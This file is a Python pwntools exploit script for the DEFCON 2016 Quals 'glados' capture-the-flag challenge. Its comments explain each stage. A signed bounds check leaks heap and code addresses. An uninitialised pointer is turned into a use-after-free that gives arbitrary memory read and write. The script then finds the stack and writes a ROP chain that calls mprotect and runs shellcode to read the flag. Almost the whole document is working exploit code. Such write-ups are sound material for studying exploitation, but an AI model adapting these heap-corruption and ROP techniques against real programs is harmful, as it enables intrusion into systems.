#!/usr/bin/env python2
#
#******************************************************************************
#                      DEFCON 2016 QUALS - GLADOS PWNABLE                      
#******************************************************************************
# 
# This was a fun challenge released at the second half of the event, which
# requires finding two bugs and some heap massaging.
#
# If you're playing along at home, I recommend making the following modififications
# to the binary, in order to disable the self-ASLR and alarm().
#
# <   4001e4:    e8 98 1d 00 00           callq  0x401f81
# ---
# >   4001e4:    e9 00 00 00 00           jmpq   0x4001e9
#
# <   4001eb:    58                       pop    %rax
# ---
# >   4001eb:    c3                       retq   
#
# <   400275:    e8 07 1d 00 00           callq  0x401f81
# ---
# >   400275:    e9 00 00 00 00           jmpq   0x40027a
#
# <   4002f5:    e8 fa 1b 00 00           callq  0x401ef4
# ---
# >   4002f5:    e9 00 00 00 00           jmpq   0x4002fa
#
from pwn import *
context.arch='amd64'

if args['REMOTE']:
    p = remote('glados_750e1878d025f65d1708549693ce5d5d.quals.shallweplayaga.me', 9292)
else:
    p = process('./glados')
    write('flag', 'THIS_IS_THE_FLAG')
    # gdb.attach(p,'''
    #     catch syscall exit
    #     continue
    # ''')

def main_menu(opt):
    p.recvuntil('Selection:')
    p.sendline(str(opt))

def create_core(type):
    main_menu(1)
    p.recvuntil('Selection:')
    p.sendline(str(type))

def interact(core):
    main_menu(5)
    p.recvuntil('Core Number')
    p.sendline(str(core))

def allocate(core, size):
    interact(core)
    p.clean()
    p.sendline(str(size))

def read_array(core, index):
    interact(core)
    p.recvuntil('Selection:')
    p.sendline(str(2))
    p.recvuntil('Which Array')
    p.sendline(str(index))
    p.recvuntil('Value: ')
    return int(p.recvline())

def write_array(core, index, value):
    interact(core)
    p.recvuntil('Selection:')
    p.sendline('3')
    p.recvuntil('Which Array')
    p.sendline(str(index))
    p.recvuntil('New Value')
    p.sendline(str(value))

def free_core(core):
    p.recvuntil('Selection:')
    p.sendline('4')
    p.recvuntil('Core Number')
    p.sendline(str(core))

CORE_ARRAY = 3
CORE_RAW   = 7

#******************************************************************************
#                         LEAK HEAP AND CODE ADDRESSES                         
#******************************************************************************
#
# The Array core type performs a signed comparison when checking the bounds
# when reading array entries.
#
# This means that we can read from *behind* our allocated array buffer.
#
# There is a pointer to our Core object in the heap just behind our buffer
# (at index -3) and a pointer to the relocated module just a bit further
# (at index -4).
#
# Let's leak these so that we have them later.
create_core(CORE_ARRAY)

# specify the size
allocate(2, 1)

heap = read_array(2, -3)
code = read_array(2, -4)

# fix code base address against what we leaked
code -= 0x235890    

log.info('heap %#x' % heap)
log.info('code %#x' % code)

# Load the ELF and set its correct address
e = ELF('./glados')
e.address = code

# free the array, since we don't need it anymore.
# it also makes later code more modular.
free_core(2)


#******************************************************************************
#                               GET ARBITRARY RW                               
#******************************************************************************
#
# The Raw core type does not initialize/sanitize its buffer pointer.
#
# That means that if you:
# - Create a Raw core
# - Allocate a buffer for it
# - Free the Raw core (which also frees the buffer)
# - Create a Raw core
#
# You end up with a Raw core with a buffer size of zero, but which still has
# a buffer pointer, pointing at the old (now-freed) buffer.
#
# The Raw core checks the buffer pointer in its destructor, and frees it if
# it is non-null.
#
# This means we can have a double-free, or turn it into a use-after-free.
#
# If we create an Array core, and get its buffer in the same place as the Raw
# core's buffer was, we can cause it to be freed.
#
# *Then* we can allocate another object to end up in the spot that both the
# Raw core and Array core point at -- but which the Array core will allow
# us to read and write from.
#
# Let's choose an Array core object to be our victim object, and just set its
# buffer to zero, and size to INT64_MAX.
#
# Once we overwrite these fields, we can read and write across the entire
# address space.
#
# We will use three cores for this:
#
# - Array core (#2) --> Will provide RW
# - Raw core   (#3) --> Will free #2's buffer
# - Array core (#4) --> Victim, will be placed where #2's buffer was

# create two objects -- an array and a raw
create_core(CORE_ARRAY)
create_core(CORE_RAW)

log.info('Created two entries. NOTE ORDERING.')

# for the raw, allocate some stuff
allocate(3, 800)

log.info('Created span of memory')

free_core(3)

log.info('Freed array and memory')

# re-allocate that object. 
# the free() ordering should put things back identically, except that
# #4 became #3 and vice-versa
create_core(CORE_RAW)

log.info('Re-allocated object.  VERIFY POINTER IS STILL GOOD.')

# Have the #2 object allocate the same data.
# Note that arrays allocate in chunks of 8.
allocate(2, 800/8)

log.info('Re-allocated chunk of memory')

# Put something there so we can find it
write_array(2, 0, 0xcafebabe)

log.info('Re-wrote magic value. VERIFY RE-ALLOCATED OBJECT STILL HAS POINTER.')

# free up that object again! via #3 now since it's at the end of the list
free_core(3)

log.info('Re-freed object and memory')

# restore that same object again so that future objects
# go into the area we control.
create_core(CORE_RAW)

log.info('Re-re allocated object')

# create the object we will control
create_core(CORE_ARRAY)

# write into that object what the fuck we want -- total control
write_array(2, 5, 0)
write_array(2, 6, 0x7fffffffffffffff)

#******************************************************************************
#                             LEAK SOME MEMORY BRO                             
#******************************************************************************
#
# Great! We now know we have arbitrary memory read-write
# Let's prove that we can leak arbitrary memory.
#
# Binjitsu provides a nice class which, given a function which leaks arbitrary
# memory at an absolute address, handles all of the behind-the-scenes stuff.
#
@MemLeak
def leak(where):
    if where % 8: 
        return None
    result = read_array(4, where/8)
    return pack(result)

assert leak.n(e.address, 4) == '\x7fELF'

#******************************************************************************
#                           DISABLE ALARM AND GLADOS                           
#******************************************************************************
#
# Let's turn off the alarm() and make GLaDoS STFU.
#
# .text:0000000000401EF4 ; unsigned int __cdecl alarm(unsigned int seconds)
# .data.rel.ro:0000000000635910                 dq offset glados_interact
#
def write(where, what):
    log.info("set %#x <-- %#x" % (where, what))
    write_array(4, where / 8, what)

alarm = 0x401ef4 - e.load_addr + e.address
glados = 0x635910 - e.load_addr + e.address

write(glados, alarm)

leak.cache.clear()
assert leak.p(0x635910) == alarm

#******************************************************************************
#                              FINDING THE STACK                               
#******************************************************************************
#
# We need to get control of the stack in order to ROP to mprotect our 
# shellcode.
#
# Before we can do that, we need to find out *where* the stack is.
# If we stop the process immediately after loading, we can see where the
# environment is on the stack.
#
# Once GladOS is initialized, we can search memory for that pointer.
# It ends up at [base address]+0x237540.
#
# For our ROP, we want to overwrite the last return address in the loop.
#
# .text:0000000000400311                 call    MAIN_LOOP_HANDLER
# .text:0000000000400316                 jmp     short loc_4002F0
#
# Once we know where the environment is on the stack, we can scan for the 
# return address so we know exactly where to overwrite.

retaddr = 0x400316 - e.load_addr + e.address

# First, we need to *locate* the stack.
p_stack = e.address + 0x237540
stack = leak.p(p_stack)

log.info("stack @ %#x" % stack)

# Now we can just search for the return address
while leak.p(stack) != retaddr:
    stack -= 8

log.info("&retaddr @ %#x" % stack)

#******************************************************************************
#                         ALL I DO IS ROP ROP ROP ROP                          
#******************************************************************************
# Now we can just write in our ROP stack directly!
#
# Since we have full stack control, let's just mprotect the stack, and put
# our shellcode after the ROP stack.
#
# .text:0000000000401F5F mprotect        proc near
#
mprotect = 0x401F5F - e.load_addr + e.address
e.symbols['mprotect'] = mprotect

# Binjitsu provides a ROP object which will find basic 'pop reg; ret' gadgets,
# given an ELF file which has the correct load address set (which we did earlier)
r = ROP(e)

# Set all of the arguments to mprotect, then jump to mprotect.
ropstack = (
    r.rdi.address,  (stack - 0x1000) & ~0xfff,
    r.rsi.address,  0x2000,
    r.rdx.address,  7,
    mprotect,
)
map(r.raw, ropstack)

# Let's calculate where our shellcode will end up.
shellcode_addr = stack + len(str(r)) + 8
e.symbols['shellcode'] = shellcode_addr
r.raw(shellcode_addr)

# For debugging purposes, dump out the ROP stack.
# It should look like this:
# 
#     0x0000:         0x402229 pop rdi; ret
#     0x0008:   0x7ffed35c9000
#     0x0010:         0x401144 pop rsi; ret
#     0x0018:           0x2000
#     0x0020:         0x40360a pop rdx; ret
#     0x0028:              0x7
#     0x0030:         0x401f5f mprotect
#     0x0038:   0x7ffed35ca1c8 shellcode
log.info('ROP Stack:\n%s' % r.dump())

# Get our shellcode together
# shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.echo('Hello!') + 
                shellcraft.cat('flag') + 
                shellcraft.exit()) 

# Put everything together
payload = str(r) + shellcode

# Our write operates on 8-byte boundaries.
while len(payload) % 8:
    payload += 'X'

# Send it all in 8-byte chunks, starting with the end.
#
# This means that the *last* thing we overwrite is the
# return address itself.
for i, chunk in list(enumerate(group(8, payload)))[::-1]:
    write(stack + 8*i, unpack(chunk))

# Bask in the glory!
p.recvuntil('Hello!')
log.success('The flag is: %r' % p.recvall())
